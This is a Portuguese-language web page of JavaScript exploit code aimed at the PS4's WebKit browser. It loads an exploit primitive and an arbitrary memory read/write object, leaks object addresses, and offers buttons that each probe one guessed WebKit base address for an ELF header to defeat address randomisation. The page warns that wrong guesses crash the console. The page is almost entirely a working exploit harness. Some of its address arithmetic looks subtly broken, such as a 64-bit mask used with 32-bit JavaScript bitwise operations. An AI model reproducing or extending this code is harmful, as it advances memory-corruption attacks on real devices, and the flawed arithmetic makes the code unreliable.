<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>PS4 WebKit — Brute Force Base</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body {
    height: 100%;
    background: #0b0f19;
    color: #c8ced8;
    font: 14px/1.5 "Segoe UI", system-ui, sans-serif;
    display: flex; flex-direction: column;
    align-items: center;
    justify-content: flex-start;
    gap: 14px;
    padding: 20px;
  }
  h1 { color: #fff; font-size: 20px; letter-spacing: 0.5px; }
  #status {
    font-size: 18px; font-weight: 700; color: #fff;
    min-height: 1.5em;
    text-align: center;
  }
  #log {
    width: 95%; max-width: 900px; height: 400px;
    background: #111827; border: 1px solid #1f2937;
    border-radius: 10px; padding: 14px 16px;
    overflow-y: auto; font-family: ui-monospace, SFMono-Regular, monospace;
    font-size: 12px; color: #9fb1c3;
    white-space: pre-wrap; word-break: break-all;
    box-shadow: inset 0 2px 8px rgba(0,0,0,0.4);
  }
  #log .ok { color: #4ade80; }
  #log .err { color: #f87171; }
  #log .info { color: #60a5fa; }
  #log .warn { color: #fbbf24; }
  #guesses {
    display: flex; gap: 8px; flex-wrap: wrap;
    justify-content: center; max-width: 900px;
  }
  .guess-btn {
    padding: 10px 16px; border: 1px solid rgba(255,255,255,0.18);
    border-radius: 8px; color: #fff;
    background: linear-gradient(135deg, #ef4444, #b91c1c);
    box-shadow: 0 4px 12px rgba(220,38,38,0.28);
    font: 700 13px/1 "Segoe UI", system-ui, sans-serif;
    cursor: pointer; transition: all .12s ease;
    min-width: 140px;
  }
  .guess-btn:hover { transform: translateY(-2px); }
  .guess-btn:active { transform: translateY(1px); }
  .guess-btn:disabled {
    opacity: 0.45; cursor: not-allowed; transform: none;
    background: #374151; box-shadow: none;
  }
  .guess-btn.found {
    background: linear-gradient(135deg, #22c55e, #15803d);
    box-shadow: 0 4px 12px rgba(34,197,94,0.28);
  }
  #warning {
    color: #fbbf24; font-size: 14px; text-align: center;
    max-width: 800px; line-height: 1.5;
  }
</style>
</head>
<body>

<h1>PS4 WebKit — Brute Force Base (1 tentativa por botão)</h1>
<div id="status">Inicializando...</div>
<div id="log"></div>
<div id="warning">
  ⚠️ Cada botão testa <b>1 endereço</b>. Se o endereço não estiver mapeado, o PS4 <b>vai crashar</b>.<br>
  Anote qual você testou. Se crashar, reinicie o PS4 e tente outro.
</div>
<div id="guesses"></div>

<script type="module">
  import { establishPrimitive } from "./resources/core.js";
  import { installWindowP } from "./resources/mem.js";
  import { int64 } from "./resources/int64.js";

  const status = document.getElementById("status");
  const logBox = document.getElementById("log");
  const guessesDiv = document.getElementById("guesses");

  function log(msg, cls = "info") {
    const line = document.createElement("div");
    line.className = cls;
    line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
    logBox.appendChild(line);
    logBox.scrollTop = logBox.scrollHeight;
  }

  function onCoreEvent(tag, detail) {
    log(`${tag}: ${detail}`, "info");
  }

  function onMemEvent(tag, detail) {
    log(`${tag}: ${detail}`, "info");
  }

  // ========== TESTAR 1 BASE ==========
  window.testBase = function(baseHex, label) {
    const p = window.p;
    if (!p) { log("window.p não disponível!", "err"); return; }

    log(`=== TESTANDO ${label} ===`, "warn");
    log(`Lendo ELF magic @ 0x${baseHex}...`, "info");

    try {
      // Parse hex string to int64
      let low = parseInt(baseHex.slice(-8), 16);
      let hi = parseInt(baseHex.slice(0, -8) || "0", 16);
      let addr = new int64(low, hi);

      let magic = p.read4(addr);
      let magicHex = "0x" + magic.toString(16).padStart(8, '0');

      log(`Magic: ${magicHex}`, "info");

      if (magicHex === "0x464c457f") {
        log(`✅ ELF ENCONTRADO @ 0x${baseHex} !!!`, "ok");
        window.__webkitBase = addr;

        // Dump header
        let eiClass = p.read1(addr.add32(4));
        let eiData = p.read1(addr.add32(5));
        log(`ELF class=${eiClass} data=${eiData}`, "ok");

        // Marcar botão como sucesso
        document.querySelectorAll('.guess-btn').forEach(btn => {
          if (btn.dataset.base === baseHex) btn.classList.add('found');
        });

        // Calcular offset do __ps5NativeCtor
        let ctor = globalThis.__ps5NativeCtor;
        if (ctor) {
          let ctorOffset = ctor - addr.low;
          if (addr.hi === 0) {
            log(`__ps5NativeCtor offset = 0x${ctorOffset.toString(16)}`, "ok");
          }
        }

        return true;
      } else {
        log(`❌ Não é ELF (magic=${magicHex})`, "err");
        return false;
      }
    } catch (e) {
      log(`❌ FALHA: ${e.name}: ${e.message}`, "err");
      // Provavelmente page fault — vai crashar em breve
      return false;
    }
  };

  // ========== CRIAR BOTÕES ==========
  function createButtons(ctor) {
    // Bases calculadas a partir do __ps5NativeCtor
    // ctor = 0x81ecf9e20 (exemplo, será substituído pelo valor real)
    const offsets = [
      { off: 0x00800000, label: "-8MB" },
      { off: 0x01000000, label: "-16MB" },
      { off: 0x01800000, label: "-24MB" },
      { off: 0x02000000, label: "-32MB" },
      { off: 0x02800000, label: "-40MB" },
      { off: 0x03000000, label: "-48MB" },
      { off: 0x03800000, label: "-56MB" },
    ];

    // Também testar a partir do vtable[0] se conhecido
    // vtable[0] ~ ctor + 0x26ebf00, então base ~ vtable - 0x28000000
    let vtableGuess = ctor + 0x26ebf00;
    offsets.push({ off: -(0x28000000 - 0x26ebf00), label: "vtable-40MB" });

    offsets.forEach(({ off, label }) => {
      let base = (ctor - off) & 0xFFFFFFFFFFFFC000;
      let baseHex = "0x" + base.toString(16).padStart(16, '0');

      let btn = document.createElement("button");
      btn.className = "guess-btn";
      btn.dataset.base = baseHex;
      btn.textContent = `${label}\n${baseHex}`;
      btn.style.whiteSpace = "pre";
      btn.onclick = () => {
        // Desabilitar todos os botões
        document.querySelectorAll('.guess-btn').forEach(b => b.disabled = true);
        testBase(baseHex, label);
      };
      guessesDiv.appendChild(btn);
    });
  }

  // ========== BOOTSTRAP ==========
  log("Carregando módulos...", "ok");
  status.textContent = "Executando exploit...";

  establishPrimitive({ onEvent: onCoreEvent })
    .then(carrier => {
      log("Core: primitivo estabelecido", "ok");
      log(`Tentativas: ${carrier.attempts}`, "info");

      const prim = installWindowP(carrier, {
        onEvent: onMemEvent,
        promote: true
      });

      log("Mem: real pair ativo", "ok");
      log("window.p está disponível", "ok");

      window.__carrier = carrier;
      window.__prim = prim;
      window.int64 = int64;

      // Pegar __ps5NativeCtor e criar botões
      let ctor = globalThis.__ps5NativeCtor;
      if (ctor) {
        log(`__ps5NativeCtor = 0x${ctor.toString(16)}`, "ok");
        createButtons(ctor);
        status.textContent = "Clique em um botão para testar a base";
        status.style.color = "#60a5fa";
      } else {
        log("__ps5NativeCtor não disponível", "err");
        status.textContent = "Erro: __ps5NativeCtor não encontrado";
        status.style.color = "#f87171";
      }

      try {
        const testAddr = prim.leakval(prim);
        log(`Sanity leak(prim) = 0x${testAddr.toString(16)}`, "ok");
      } catch (e) {
        log(`Sanity leak falhou: ${e.message}`, "err");
      }
    })
    .catch(err => {
      log(`FALHA: ${err.name}: ${err.message}`, "err");
      status.textContent = "Falha no exploit";
      status.style.color = "#f87171";
    });
</script>

</body>
</html>
